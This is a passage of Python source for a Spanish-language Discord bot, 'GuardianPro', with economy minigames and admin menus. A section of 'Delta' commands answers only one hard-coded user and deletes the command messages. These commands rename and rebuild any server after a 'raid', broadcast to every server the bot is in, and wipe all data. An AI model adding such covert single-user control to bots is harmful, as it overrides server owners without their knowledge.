    embed.add_field(name="💰 Ganaste", value=f"${final_reward:,}", inline=True)

    if bonus_multiplier > 1.0:
        embed.add_field(
            name="🎯 Bonus",
            value=f"+{int((bonus_multiplier-1)*100)}% (Arco de Caza)",
            inline=True)

    # Probabilidad de encontrar item raro
    if random.random() < 0.15:  # 15% de probabilidad
        rare_items = ["Piel de Lobo", "Cuerno de Ciervo", "Pluma Dorada"]
        found_item = random.choice(rare_items)
        add_item_to_inventory(ctx.author.id, found_item, 1)
        embed.add_field(name="🎁 Item encontrado",
                        value=f"**{found_item}**",
                        inline=False)

    await ctx.send(embed=embed)


@bot.command(name='mine')
async def mine_command(ctx):
    """Minar minerales para ganar dinero"""
    if not can_use_cooldown(ctx.author.id, 'mine', 600):  # 10 minutos
        remaining = get_cooldown_remaining(ctx.author.id, 'mine', 600)
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        await ctx.send(
            f"⛏️ Debes esperar **{minutes}m {seconds}s** antes de minar de nuevo."
        )
        return

    # Verificar si tiene herramientas
    inventory = get_user_inventory(ctx.author.id)
    bonus_multiplier = 1.0

    if "Pico de Hierro" in inventory:
        bonus_multiplier = 1.5  # +50%

    # Minerales y ganancias
    minerals = [("⚫ Carbón", 200, 400), ("🔩 Hierro", 350, 550),
                ("🥈 Plata", 450, 750), ("🥇 Oro", 600, 1000),
                ("💎 Diamante", 800, 1500)]

    mineral_name, min_reward, max_reward = random.choice(minerals)
    base_reward = random.randint(min_reward, max_reward)
    final_reward = int(base_reward * bonus_multiplier)

    update_balance(ctx.author.id, final_reward, 0)

    embed = discord.Embed(title="⛏️ Expedición de Minería",
                          color=discord.Color.purple())
    embed.add_field(name="💎 Mineral", value=mineral_name, inline=True)
    embed.add_field(name="💰 Ganaste", value=f"${final_reward:,}", inline=True)

    if bonus_multiplier > 1.0:
        embed.add_field(
            name="🎯 Bonus",
            value=f"+{int((bonus_multiplier-1)*100)}% (Pico de Hierro)",
            inline=True)

    # Probabilidad de encontrar gema rara
    if random.random() < 0.12:  # 12% de probabilidad
        rare_gems = ["Esmeralda", "Rubí", "Zafiro", "Cuarzo Místico"]
        found_gem = random.choice(rare_gems)
        add_item_to_inventory(ctx.author.id, found_gem, 1)
        embed.add_field(name="✨ Gema encontrada",
                        value=f"**{found_gem}**",
                        inline=False)

    await ctx.send(embed=embed)


@bot.command(name='explore')
async def explore_command(ctx):
    """Explorar lugares misteriosos"""
    if not can_use_cooldown(ctx.author.id, 'explore', 1200):  # 20 minutos
        remaining = get_cooldown_remaining(ctx.author.id, 'explore', 1200)
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        await ctx.send(
            f"🗺️ Debes esperar **{minutes}m {seconds}s** antes de explorar de nuevo."
        )
        return

    # Verificar si tiene mapa del tesoro
    inventory = get_user_inventory(ctx.author.id)
    bonus_multiplier = 1.0

    if "Mapa del Tesoro" in inventory:
        bonus_multiplier = 1.7  # +70%

    # Lugares y recompensas
    locations = [("🏰 Castillo Abandonado", 400, 800),
                 ("🏝️ Isla Misteriosa", 500, 900),
                 ("🌋 Volcán Dormido", 600, 1100),
                 ("🕳️ Cueva Profunda", 350, 700),
                 ("🏛️ Ruinas Antiguas", 700, 1300)]

    location_name, min_reward, max_reward = random.choice(locations)
    base_reward = random.randint(min_reward, max_reward)
    final_reward = int(base_reward * bonus_multiplier)

    update_balance(ctx.author.id, final_reward, 0)

    embed = discord.Embed(title="🗺️ Expedición de Exploración",
                          color=discord.Color.orange())
    embed.add_field(name="🏛️ Lugar", value=location_name, inline=True)
    embed.add_field(name="💰 Ganaste", value=f"${final_reward:,}", inline=True)

    if bonus_multiplier > 1.0:
        embed.add_field(
            name="🎯 Bonus",
            value=f"+{int((bonus_multiplier-1)*100)}% (Mapa del Tesoro)",
            inline=True)

    # Probabilidad alta de encontrar tesoros
    if random.random() < 0.20:  # 20% de probabilidad
        treasures = [
            "Cofre Dorado", "Reliquia Antigua", "Pergamino Mágico",
            "Amuleto Perdido"
        ]
        found_treasure = random.choice(treasures)
        add_item_to_inventory(ctx.author.id, found_treasure, 1)
        embed.add_field(name="🎁 Tesoro encontrado",
                        value=f"**{found_treasure}**",
                        inline=False)

    await ctx.send(embed=embed)


@bot.command(name='fish')
async def fish_command(ctx):
    """Pescar en el lago"""
    if not can_use_cooldown(ctx.author.id, 'fish', 480):  # 8 minutos
        remaining = get_cooldown_remaining(ctx.author.id, 'fish', 480)
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        await ctx.send(
            f"🎣 Debes esperar **{minutes}m {seconds}s** antes de pescar de nuevo."
        )
        return

    # Verificar si tiene caña profesional
    inventory = get_user_inventory(ctx.author.id)
    bonus_multiplier = 1.0

    if "Caña Pro" in inventory:
        bonus_multiplier = 1.4  # +40%

    # Peces y ganancias
    fish_types = [("🐟 Pez Común", 150, 300), ("🐠 Pez Tropical", 250, 450),
                  ("🎣 Trucha", 300, 500), ("🐡 Pez Globo", 400, 650),
                  ("🦈 Tiburón", 600, 1000)]

    fish_name, min_reward, max_reward = random.choice(fish_types)
    base_reward = random.randint(min_reward, max_reward)
    final_reward = int(base_reward * bonus_multiplier)

    update_balance(ctx.author.id, final_reward, 0)

    embed = discord.Embed(title="🎣 Día de Pesca", color=discord.Color.teal())
    embed.add_field(name="🐟 Pescaste", value=fish_name, inline=True)
    embed.add_field(name="💰 Ganaste", value=f"${final_reward:,}", inline=True)

    if bonus_multiplier > 1.0:
        embed.add_field(name="🎯 Bonus",
                        value=f"+{int((bonus_multiplier-1)*100)}% (Caña Pro)",
                        inline=True)

    # Probabilidad de pescar algo especial
    if random.random() < 0.10:  # 10% de probabilidad
        special_items = [
            "Perla Rara", "Botella con Mensaje", "Moneda Antigua",
            "Coral Mágico"
        ]
        found_item = random.choice(special_items)
        add_item_to_inventory(ctx.author.id, found_item, 1)
        embed.add_field(name="✨ Encontraste",
                        value=f"**{found_item}**",
                        inline=False)

    await ctx.send(embed=embed)


# ================================
# COMANDOS DELTA ADICIONALES (SOLO CUELI13)
# ================================


@bot.command(name='S')
async def restore_server(ctx):
    """∆S - Restaurar servidor después del raid"""
    # Verificar usuario autorizado
    if not is_authorized_user(ctx.author):
        return

    # Verificar si los comandos ∆ están habilitados
    if not delta_commands_enabled:
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    await ctx.send("🔧 Iniciando restauración del servidor...")
    print(f"Restauración iniciada en el servidor {guild.name}")

    try:
        # Restaurar nombre del servidor
        await guild.edit(name="Servidor Restaurado")
        print("Nombre del servidor restaurado")

        # Crear canales básicos
        basic_channels = [
            "📋・reglas", "💬・general", "🎮・gaming", "🤖・bot-commands", "📢・anuncios"
        ]

        overwrites = {
            guild.default_role:
            discord.PermissionOverwrite(read_messages=True,
                                        send_messages=True,
                                        view_channel=True)
        }

        for channel_name in basic_channels:
            try:
                await guild.create_text_channel(channel_name,
                                                overwrites=overwrites)
                print(f"Canal creado: {channel_name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Error al crear canal {channel_name}: {e}")

        # Crear roles básicos
        basic_roles = [("🛡️ Moderador", discord.Color.blue()),
                       ("👑 VIP", discord.Color.gold()),
                       ("🎮 Gamer", discord.Color.green()),
                       ("🎵 Música", discord.Color.purple())]

        for role_name, color in basic_roles:
            try:
                await guild.create_role(name=role_name, colour=color)
                print(f"Rol creado: {role_name}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Error al crear rol {role_name}: {e}")

        await ctx.send("✅ Servidor restaurado exitosamente!")
        print(f"Restauración completada en {guild.name}")

    except Exception as e:
        await ctx.send(f"❌ Error durante la restauración: {str(e)}")
        print(f"Error en restauración: {e}")


@bot.command(name='E')
async def toggle_economy_mode(ctx):
    """∆E - Activar/desactivar modo economía"""
    # Verificar usuario autorizado
    if not is_authorized_user(ctx.author):
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    global economy_only_mode
    economy_only_mode = not economy_only_mode

    status = "✅ ACTIVADO" if economy_only_mode else "❌ DESACTIVADO"
    await ctx.send(f"🏦 **Modo Economía:** {status}")

    if economy_only_mode:
        await ctx.send(
            "📢 Solo comandos de economía (prefijo .) están disponibles.")
    else:
        await ctx.send("📢 Todos los comandos están disponibles nuevamente.")


@bot.command(name='X')
async def broadcast_announcement(ctx, *, message=None):
    """∆X - Enviar anuncios a todos los servidores"""
    # Verificar usuario autorizado
    if not is_authorized_user(ctx.author):
        return

    if not message:
        await ctx.send("❌ Uso: `∆X <mensaje>`")
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    await ctx.send(f"📡 Enviando anuncio a {len(bot.guilds)} servidores...")

    successful_sends = 0
    failed_sends = 0

    for guild in bot.guilds:
        try:
            # Buscar canal para enviar (prioridad: anuncios, general, primer canal disponible)
            target_channel = None

            # Buscar canal de anuncios
            for channel in guild.text_channels:
                if any(word in channel.name.lower() for word in
                       ['anuncio', 'announcement', 'news', 'avisos']):
                    if channel.permissions_for(guild.me).send_messages:
                        target_channel = channel
                        break

            # Si no hay canal de anuncios, buscar general
            if not target_channel:
                for channel in guild.text_channels:
                    if 'general' in channel.name.lower():
                        if channel.permissions_for(guild.me).send_messages:
                            target_channel = channel
                            break

            # Si no hay general, usar primer canal disponible
            if not target_channel:
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).send_messages:
                        target_channel = channel
                        break

            if target_channel:
                embed = discord.Embed(title="📢 Anuncio Global",
                                      description=message,
                                      color=discord.Color.blue())
                embed.set_footer(text=f"Anuncio enviado por {ctx.author.name}")

                await target_channel.send(embed=embed)
                successful_sends += 1
                print(f"Anuncio enviado a: {guild.name}")
            else:
                failed_sends += 1
                print(
                    f"No se pudo enviar anuncio a: {guild.name} (sin permisos)"
                )

        except Exception as e:
            failed_sends += 1
            print(f"Error enviando anuncio a {guild.name}: {e}")

        # Pequeña pausa para evitar rate limits
        await asyncio.sleep(0.5)

    # Reporte final
    embed = discord.Embed(title="📊 Reporte de Anuncio Global",
                          color=discord.Color.green())
    embed.add_field(name="✅ Exitosos", value=successful_sends, inline=True)
    embed.add_field(name="❌ Fallidos", value=failed_sends, inline=True)
    embed.add_field(name="📊 Total", value=len(bot.guilds), inline=True)
    embed.add_field(name="📝 Mensaje",
                    value=message[:100] +
                    "..." if len(message) > 100 else message,
                    inline=False)

    await ctx.send(embed=embed)


@bot.command(name='D')
async def system_status(ctx):
    """∆D - Ver estado del sistema"""
    # Verificar usuario autorizado
    if not is_authorized_user(ctx.author):
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    embed = discord.Embed(title="🖥️ Estado del Sistema GuardianPro",
                          color=discord.Color.blue())

    # Estados del sistema
    embed.add_field(
        name="⚙️ Configuración",
        value=
        f"**Comandos ∆:** {'✅ Habilitados' if delta_commands_enabled else '❌ Deshabilitados'}\n"
        f"**Modo Economía:** {'✅ Activo' if economy_only_mode else '❌ Inactivo'}",
        inline=False)

    # Estadísticas del bot
    total_users = len(bot.users)
    total_guilds = len(bot.guilds)

    embed.add_field(
        name="📊 Estadísticas",
        value=f"**Servidores:** {total_guilds}\n"
        f"**Usuarios:** {total_users}\n"
        f"**Canales:** {len([c for g in bot.guilds for c in g.channels])}",
        inline=True)

    # Datos de economía
    total_users_with_balance = len(balances)
    total_money_in_system = sum(data['wallet'] + data['bank']
                                for data in balances.values())

    embed.add_field(
        name="💰 Sistema de Economía",
        value=f"**Usuarios con balance:** {total_users_with_balance}\n"
        f"**Dinero total:** ${total_money_in_system:,}\n"
        f"**Sorteos activos:** {len(active_giveaways)}",
        inline=True)

    # Sistema de niveles
    total_users_with_levels = len(user_levels)
    total_messages = sum(data['messages'] for data in user_levels.values())

    embed.add_field(
        name="🏆 Sistema de Niveles",
        value=f"**Usuarios con nivel:** {total_users_with_levels}\n"
        f"**Mensajes totales:** {total_messages:,}\n"
        f"**Tickets activos:** {len(active_tickets)}",
        inline=True)

    # Estado de automod
    automod_servers = len([g for g in automod_enabled.values() if g])

    embed.add_field(name="🛡️ Moderación",
                    value=f"**Automod activo:** {automod_servers} servidores\n"
                    f"**Palabras filtradas:** {len(banned_words)}\n"
                    f"**Usuarios con advertencias:** {len(warning_counts)}",
                    inline=False)

    embed.set_footer(text=f"Sistema operado por {ctx.author.name}")
    await ctx.send(embed=embed)


@bot.command(name='R')
async def reset_all_configs(ctx):
    """∆R - Resetear todas las configuraciones"""
    # Verificar usuario autorizado
    if not is_authorized_user(ctx.author):
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    # Confirmar reset
    embed = discord.Embed(
        title="⚠️ CONFIRMACIÓN DE RESET",
        description=
        "**¿Estás seguro de que quieres resetear TODAS las configuraciones?**\n\n"
        "Esto incluye:\n"
        "• Balances de economía\n"
        "• Niveles de usuarios\n"
        "• Inventarios\n"
        "• Cooldowns\n"
        "• Configuraciones de automod\n"
        "• Tickets activos\n"
        "• Sorteos activos\n\n"
        "**⚠️ ESTA ACCIÓN NO SE PUEDE DESHACER ⚠️**",
        color=discord.Color.red())

    msg = await ctx.send(embed=embed)

    # Añadir reacciones para confirmar
    await msg.add_reaction("✅")
    await msg.add_reaction("❌")

    def check(reaction, user):
        return user == ctx.author and str(
            reaction.emoji) in ["✅", "❌"] and reaction.message.id == msg.id

    try:
        reaction, user = await bot.wait_for('reaction_add',
                                            timeout=30.0,
                                            check=check)

        if str(reaction.emoji) == "✅":
            # Proceder con el reset
            global balances, user_levels, inventories, cooldowns
            global automod_enabled, automod_settings, warning_counts
            global active_tickets, active_giveaways, active_timers

            # Reset de todos los datos
            balances = {}
            user_levels = {}
            inventories = {}
            cooldowns = {}
            automod_enabled = {}
            automod_settings = {}
            warning_counts = {}
            active_tickets = {}
            active_giveaways = {}
            active_timers = {}

            # Guardar archivos vacíos
            save_balances()
            save_levels()
            save_inventories()
            save_cooldowns()

            # Reset de configuraciones globales
            global delta_commands_enabled, economy_only_mode
            delta_commands_enabled = True
            economy_only_mode = False

            reset_embed = discord.Embed(
                title="🔄 RESET COMPLETADO",
                description=
                "**Todas las configuraciones han sido reseteadas exitosamente.**\n\n"
                "✅ Balances de economía limpiados\n"
                "✅ Niveles de usuarios reseteados\n"
                "✅ Inventarios vaciados\n"
                "✅ Cooldowns limpiados\n"
                "✅ Configuraciones de automod reseteadas\n"
                "✅ Tickets y sorteos cerrados\n"
                "✅ Configuraciones globales restauradas",
                color=discord.Color.green())
            reset_embed.set_footer(
                text="El bot ha sido completamente reseteado")

            await msg.edit(embed=reset_embed)

            print(f"RESET COMPLETO ejecutado por {ctx.author.name}")

        else:
            cancel_embed = discord.Embed(
                title="❌ Reset Cancelado",
                description=
                "El reset ha sido cancelado. Todas las configuraciones permanecen intactas.",
                color=discord.Color.orange())
            await msg.edit(embed=cancel_embed)

    except asyncio.TimeoutError:
        timeout_embed = discord.Embed(
            title="⏰ Tiempo Agotado",
            description="El reset fue cancelado debido a inactividad.",
            color=discord.Color.orange())
        await msg.edit(embed=timeout_embed)


# ================================
# CLASES PARA MENÚS DE SELECCIÓN ADMINISTRATIVOS
# ================================


class AdminMenuView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.select(
        placeholder="Selecciona una categoría administrativa...",
        options=[
            discord.SelectOption(
                label="📊 Información y Estadísticas",
                description="Ver información del servidor y estadísticas",
                emoji="📊",
                value="info"),
            discord.SelectOption(label="💰 Gestión de Economía",
                                 description="Administrar dinero de usuarios",
                                 emoji="💰",
                                 value="economy"),
            discord.SelectOption(label="🎫 Sistema de Tickets",
                                 description="Gestionar tickets y categorías",
                                 emoji="🎫",
                                 value="tickets"),
            discord.SelectOption(
                label="🔧 Configuración del Servidor",
                description="Módulos, automod y configuraciones",
                emoji="🔧",
                value="config"),
            discord.SelectOption(
                label="🛠️ Utilidades y Mantenimiento",
                description="Limpieza, respaldos y herramientas",
                emoji="🛠️",
                value="utils")
        ])
    async def select_category(self, interaction: discord.Interaction,
                              select: discord.ui.Select):
        selected_value = select.values[0]

        if selected_value == "info":
            view = InfoMenuView()
            title = "📊 Información - Panel Administrativo"
        elif selected_value == "economy":
            view = EconomyMenuView()
            title = "💰 Economía - Panel Administrativo"
        elif selected_value == "tickets":
            view = TicketsMenuView()
            title = "🎫 Tickets - Panel Administrativo"
        elif selected_value == "config":
            view = ConfigMenuView()
            title = "🔧 Configuración - Panel Administrativo"
        elif selected_value == "utils":
            view = UtilsMenuView()
            title = "🛠️ Utilidades - Panel Administrativo"
        else:
            return

        embed = discord.Embed(title=title,
                              description="Selecciona una acción del menú:",
                              color=discord.Color.blue())

        await interaction.response.edit_message(embed=embed, view=view)


class InfoMenuView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.select(
        placeholder="Selecciona qué información ver...",
        options=[
            discord.SelectOption(label="📋 Información General del Servidor",
                                 description="Ver datos básicos del servidor",
                                 emoji="📋",
                                 value="server_info"),
            discord.SelectOption(
                label="📊 Estadísticas Detalladas",
                description="Estadísticas completas y métricas",
                emoji="📊",
                value="detailed_stats"),
            discord.SelectOption(
                label="👥 Estado de Miembros",
                description="Miembros online, offline, bots, etc.",
                emoji="👥",
                value="member_status"),
            discord.SelectOption(label="🔙 Volver al Menú Principal",
                                 description="Regresar al panel principal",
                                 emoji="🔙",
                                 value="back")
        ])
    async def select_info_action(self, interaction: discord.Interaction,
                                 select: discord.ui.Select):
        if select.values[0] == "back":
            view = AdminMenuView()
            embed = discord.Embed(
                title="🛡️ Panel de Administración Completo",
                description="Selecciona una categoría administrativa:",
                color=discord.Color.red())
            await interaction.response.edit_message(embed=embed, view=view)
            return

        if select.values[0] == "server_info":
            await self.show_server_info(interaction)
        elif select.values[0] == "detailed_stats":
            await self.show_detailed_stats(interaction)
        elif select.values[0] == "member_status":
            await self.show_member_status(interaction)

    async def show_server_info(self, interaction):
        guild = interaction.guild
        embed = discord.Embed(title="📋 Información General del Servidor",
                              color=discord.Color.blue())
        embed.add_field(name="🏰 Nombre", value=guild.name, inline=True)
        embed.add_field(name="🆔 ID", value=guild.id, inline=True)
        embed.add_field(
            name="👑 Propietario",
            value=guild.owner.mention if guild.owner else "Desconocido",
            inline=True)
        embed.add_field(name="📅 Creado",
                        value=f"<t:{int(guild.created_at.timestamp())}:R>",
                        inline=True)
        embed.add_field(name="👥 Miembros",
                        value=guild.member_count,
                        inline=True)
        embed.add_field(name="🏷️ Roles", value=len(guild.roles), inline=True)
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        await interaction.response.edit_message(embed=embed, view=self)

    async def show_detailed_stats(self, interaction):
        guild = interaction.guild
        text_channels = len(
            [c for c in guild.channels if isinstance(c, discord.TextChannel)])
        voice_channels = len(
            [c for c in guild.channels if isinstance(c, discord.VoiceChannel)])

        embed = discord.Embed(title="📊 Estadísticas Detalladas",
                              color=discord.Color.green())
        embed.add_field(name="📝 Canales de Texto",
                        value=text_channels,
                        inline=True)
        embed.add_field(name="🔊 Canales de Voz",
                        value=voice_channels,
                        inline=True)
        embed.add_field(name="📁 Categorías",
                        value=len([
                            c for c in guild.channels
                            if isinstance(c, discord.CategoryChannel)
                        ]),
                        inline=True)
        embed.add_field(name="😄 Emojis", value=len(guild.emojis), inline=True)
        embed.add_field(name="🎉 Boosts",
                        value=guild.premium_subscription_count or 0,
                        inline=True)
        embed.add_field(name="⭐ Nivel Boost",
                        value=f"Nivel {guild.premium_tier}",
                        inline=True)
        embed.add_field(name="🎫 Tickets Activos",
                        value=len(active_tickets),
                        inline=True)
        embed.add_field(name="💰 Usuarios con Balance",
                        value=len(balances),
                        inline=True)
        embed.add_field(name="🎁 Sorteos Activos",
                        value=len(active_giveaways),
                        inline=True)
        await interaction.response.edit_message(embed=embed, view=self)

    async def show_member_status(self, interaction):
        guild = interaction.guild
        online = len(
            [m for m in guild.members if m.status == discord.Status.online])
        idle = len(
            [m for m in guild.members if m.status == discord.Status.idle])
        dnd = len([m for m in guild.members if m.status == discord.Status.dnd])
        offline = len(
            [m for m in guild.members if m.status == discord.Status.offline])
        bots = len([m for m in guild.members if m.bot])

        embed = discord.Embed(title="👥 Estado de Miembros",
                              color=discord.Color.purple())
        embed.add_field(name="🟢 En Línea", value=online, inline=True)
        embed.add_field(name="🟡 Ausente", value=idle, inline=True)
        embed.add_field(name="🔴 No Molestar", value=dnd, inline=True)
        embed.add_field(name="⚪ Desconectado", value=offline, inline=True)
        embed.add_field(name="🤖 Bots", value=bots, inline=True)
        embed.add_field(name="👥 Total", value=guild.member_count, inline=True)
        await interaction.response.edit_message(embed=embed, view=self)


class EconomyMenuView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.select(
        placeholder="Selecciona una acción de economía...",
        options=[
            discord.SelectOption(
                label="💸 Añadir Dinero a Usuario",
                description="Dar dinero a un usuario específico",
                emoji="💸",
                value="add_money"),
            discord.SelectOption(label="💳 Quitar Dinero a Usuario",
                                 description="Remover dinero de un usuario",
                                 emoji="💳",
                                 value="remove_money"),
            discord.SelectOption(label="🔄 Resetear Balance de Usuario",
                                 description="Poner balance de usuario en $0",
                                 emoji="🔄",
                                 value="reset_balance"),
            discord.SelectOption(
                label="🎰 Configurar Premio de Lotería",
                description="Establecer premio del comando .win",
                emoji="🎰",
                value="set_lottery"),
            discord.SelectOption(
                label="🎫 Ver Info de Lotería",
                description="Ver configuración actual de lotería",
                emoji="🎫",
                value="lottery_info"),
            discord.SelectOption(label="🔙 Volver al Menú Principal",
                                 description="Regresar al panel principal",
                                 emoji="🔙",
                                 value="back")
        ])
    async def select_economy_action(self, interaction: discord.Interaction,
                                    select: discord.ui.Select):
        if select.values[0] == "back":
            view = AdminMenuView()
            embed = discord.Embed(
                title="🛡️ Panel de Administración Completo",
                description="Selecciona una categoría administrativa:",
                color=discord.Color.red())
            await interaction.response.edit_message(embed=embed, view=view)
            return

        if select.values[0] == "lottery_info":
            await self.show_lottery_info(interaction)
        else:
            embed = discord.Embed(
                title="💰 Acción de Economía",
                description=
                f"Para usar esta función, utiliza los siguientes comandos slash:\n\n"
                f"**Añadir dinero:** `/eco @usuario cantidad`\n"
                f"**Quitar dinero:** `/oce @usuario cantidad`\n"
                f"**Resetear balance:** `/ecoreset @usuario`\n"
                f"**Configurar lotería:** `/winset <premio>`\n\n"
                f"**Ejemplo:** `/eco @Juan 5000` para dar $5,000 a Juan",
                color=discord.Color.gold())
            await interaction.response.edit_message(embed=embed, view=self)

    async def show_lottery_info(self, interaction):
        guild_id = str(interaction.guild.id)
        if guild_id not in lottery_settings or not lottery_settings[
                guild_id].get('reward'):
            embed = discord.Embed(
                title="🎰 Información de Lotería",
                description=
                "❌ No hay premio configurado para la lotería.\n\nUsa `/winset <premio>` para configurar uno.",
                color=discord.Color.red())
        else:
            reward = lottery_settings[guild_id]['reward']
            embed = discord.Embed(title="🎰 Información de Lotería",
                                  color=discord.Color.blue())
            embed.add_field(name="🏆 Premio Actual", value=reward, inline=False)
            embed.add_field(name="💰 Costo", value="$10,000", inline=True)
            embed.add_field(name="🎯 Probabilidad",
                            value="0.5% (1/200)",
                            inline=True)
            embed.add_field(name="📝 Comando", value="`.win`", inline=True)

        await interaction.response.edit_message(embed=embed, view=self)


class TicketsMenuView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.select(
        placeholder="Selecciona una acción de tickets...",
        options=[
            discord.SelectOption(
                label="🎫 Configurar Panel de Tickets",
                description="Crear panel de tickets en el canal",
                emoji="🎫",
                value="setup_panel"),
            discord.SelectOption(
                label="📋 Gestionar Categorías",
                description="Añadir, editar o eliminar categorías",
                emoji="📋",
                value="manage_categories"),
            discord.SelectOption(
                label="❌ Cerrar Todos los Tickets",
                description="Cerrar todos los tickets abiertos",
                emoji="❌",
                value="close_all"),
            discord.SelectOption(label="📊 Estadísticas de Tickets",
                                 description="Ver estadísticas y historial",
                                 emoji="📊",
                                 value="ticket_stats"),
            discord.SelectOption(label="🔙 Volver al Menú Principal",
                                 description="Regresar al panel principal",
                                 emoji="🔙",
                                 value="back")
        ])
    async def select_ticket_action(self, interaction: discord.Interaction,
                                   select: discord.ui.Select):
        selected = select.values[0]

        if selected == "back":
            view = AdminMenuView()
            embed = discord.Embed(
                title="🛡️ Panel de Administración Completo",
                description="Selecciona una categoría administrativa:",
                color=discord.Color.red())
            await interaction.response.edit_message(embed=embed, view=view)
            return

        if selected == "close_all":
            await self.close_all_tickets(interaction)
        elif selected == "manage_categories":
            view = TicketCategoryMenuView()
            embed = discord.Embed(
                title="📋 Gestión de Categorías de Tickets",
                description=
                "Selecciona qué acción realizar con las categorías:",
                color=discord.Color.purple())
            await interaction.response.edit_message(embed=embed, view=view)
        elif selected == "setup_panel":
            embed = discord.Embed(
                title="🎫 Configurar Panel de Tickets",
                description="Para configurar el panel de tickets, usa:\n\n"
                "**Comando:** `/ticket_setup`\n\n"
                "Este comando creará un panel interactivo con botones para cada categoría de ticket en el canal actual.\n\n"
                "📝 **Nota:** Asegúrate de tener categorías configuradas antes de crear el panel.",
                color=discord.Color.blue())
            await interaction.response.edit_message(embed=embed, view=self)
        elif selected == "ticket_stats":
            await self.show_ticket_stats(interaction)
        else:
            embed = discord.Embed(
                title="🎫 Gestión de Tickets",
                description="Selecciona una opción del menú para continuar.",
                color=discord.Color.purple())
            await interaction.response.edit_message(embed=embed, view=self)

    async def show_ticket_stats(self, interaction):
        guild = interaction.guild
        active_tickets_count = len(
            [ch for ch in guild.channels if ch.name.startswith('ticket-')])
        total_categories = len(get_guild_categories(guild.id))

        embed = discord.Embed(title="📊 Estadísticas de Tickets",
                              color=discord.Color.green())
        embed.add_field(name="🎫 Tickets Activos",
                        value=active_tickets_count,
                        inline=True)
        embed.add_field(name="📋 Categorías Configuradas",
                        value=total_categories,
                        inline=True)
        embed.add_field(name="🏛️ Servidor", value=guild.name, inline=True)

        # Mostrar tickets activos si hay
        if active_tickets_count > 0:
            active_list = []
            for channel in guild.channels:
                if channel.name.startswith('ticket-') and len(active_list) < 5:
                    active_list.append(f"• {channel.mention}")

            if active_list:
                embed.add_field(
                    name="🎫 Tickets Abiertos",
                    value="\n".join(active_list) +
                    (f"\n... y {active_tickets_count - len(active_list)} más"
                     if active_tickets_count > 5 else ""),
                    inline=False)

        await interaction.response.edit_message(embed=embed, view=self)

    async def close_all_tickets(self, interaction):
        guild = interaction.guild
        tickets_closed = 0

        for channel in guild.channels:
            if channel.name.startswith('ticket-'):
                try:
                    await channel.delete()
                    tickets_closed += 1
                except:
                    pass

        active_tickets.clear()

        embed = discord.Embed(
            title="❌ Tickets Cerrados",
            description=f"Se cerraron {tickets_closed} tickets exitosamente.",
            color=discord.Color.orange())
        await interaction.response.edit_message(embed=embed, view=self)


class ConfigMenuView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.select(
        placeholder="Selecciona una configuración...",
        options=[
            discord.SelectOption(label="⚙️ Gestionar Módulos del Bot",
                                 description="Activar/desactivar funciones",
                                 emoji="⚙️",
                                 value="modules"),
            discord.SelectOption(label="🛡️ Configurar Automod",
                                 description="Moderación automática",
                                 emoji="🛡️",
                                 value="automod"),
            discord.SelectOption(
                label="👋 Sistema de Bienvenidas",
                description="Configurar mensajes de bienvenida",
                emoji="👋",
                value="welcome"),
            discord.SelectOption(label="🎉 Crear Sorteo",
                                 description="Iniciar un sorteo interactivo",
                                 emoji="🎉",
                                 value="giveaway"),
            discord.SelectOption(label="🔙 Volver al Menú Principal",
                                 description="Regresar al panel principal",
                                 emoji="🔙",
                                 value="back")
        ])
    async def select_config_action(self, interaction: discord.Interaction,
                                   select: discord.ui.Select):
        if select.values[0] == "back":
            view = AdminMenuView()
            embed = discord.Embed(
                title="🛡️ Panel de Administración Completo",
                description="Selecciona una categoría administrativa:",
                color=discord.Color.red())
            await interaction.response.edit_message(embed=embed, view=view)
            return

        if select.values[0] == "modules":
            await self.show_modules_status(interaction)
        else:
            embed = discord.Embed(
                title="🔧 Configuración del Servidor",
                description=
                f"Para usar esta función, utiliza los siguientes comandos:\n\n"
                f"**Gestionar módulos:** `/modules <módulo> <acción>`\n"
                f"**Configurar automod:** `/automod <enable> [opciones]`\n"
                f"**Crear sorteo:** `/gstart <ganadores> <premio>`\n\n"
                f"**Ejemplo:** `/modules economy enable`",
                color=discord.Color.teal())
            await interaction.response.edit_message(embed=embed, view=self)

    async def show_modules_status(self, interaction):
        embed = discord.Embed(
            title="⚙️ Estado de Módulos",
            description="Estado actual de todos los módulos del bot:",
            color=discord.Color.blue())

        module_names = {
            'economy': '💰 Sistema de Economía',
            'levels': '🏆 Sistema de Niveles',
            'tickets': '🎫 Sistema de Tickets',
            'automod': '🛡️ Moderación Automática',
            'giveaways': '🎉 Sorteos',
            'entertainment': '🎮 Entretenimiento'
        }

        for mod_key, mod_name in module_names.items():
            status = "✅ Activado" if system_modules.get(
                mod_key, True) else "❌ Desactivado"
            embed.add_field(name=mod_name, value=status, inline=True)

        embed.add_field(name="📝 Cambiar Estado",
                        value="Usa `/modules <módulo> <enable/disable>`",
                        inline=False)
        await interaction.response.edit_message(embed=embed, view=self)


class UtilsMenuView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.select(
        placeholder="Selecciona una utilidad...",
        options=[
            discord.SelectOption(label="🗑️ Limpiar Mensajes",
                                 description="Borrar mensajes del canal",
                                 emoji="🗑️",
                                 value="purge"),
            discord.SelectOption(
                label="💬 Hacer que el Bot Hable",
                description="Comando /say para enviar mensajes",
                emoji="💬",
                value="say_command"),
            discord.SelectOption(label="🔐 Gestionar Permisos Especiales",
